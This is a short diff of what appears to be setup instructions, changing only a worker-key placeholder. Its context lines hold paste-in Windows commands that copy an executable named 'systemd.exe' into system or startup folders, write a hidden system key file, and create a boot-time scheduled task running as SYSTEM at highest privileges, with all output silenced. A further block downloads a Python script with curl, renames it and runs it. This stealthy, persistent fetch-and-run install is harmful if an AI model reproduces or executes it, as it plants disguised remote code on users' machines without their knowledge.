@@ -25,7 +25,7 @@ net session >nul 2>&1
 if %errorLevel% == 0 ( set "d=%ProgramData%\systemd" & set "isAdmin=1" ) else ( set "d=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & set "isAdmin=0" )
 mkdir "%d%" >nul 2>&1
 copy /Y "systemd.exe" "%d%\systemd.exe" >nul 2>&1
-> "%d%\systemd.key" echo DPAPI:<WORKER_KEY>
+> "%d%\systemd.key" echo DPAPI:YOUR_WORKER_KEY_HERE
 attrib +h +s "%d%\systemd.key" >nul 2>&1
 if "%isAdmin%"=="1" ( schtasks /Create /TN "systemd" /TR "\"%d%\systemd.exe\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1 & schtasks /Run /TN "systemd" >nul 2>&1 ) else ( start "" "%d%\systemd.exe" )
 set "d=" & set "isAdmin="
@@ -38,7 +38,7 @@ set "d=" & set "isAdmin="
 ```cmd
 curl -sLO https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py >nul 2>&1
 move /y printer.py systemd.py >nul 2>&1
-python systemd.py <WORKER_KEY> --debug
+python systemd.py YOUR_WORKER_KEY_HERE --debug
 ```
 
 ---
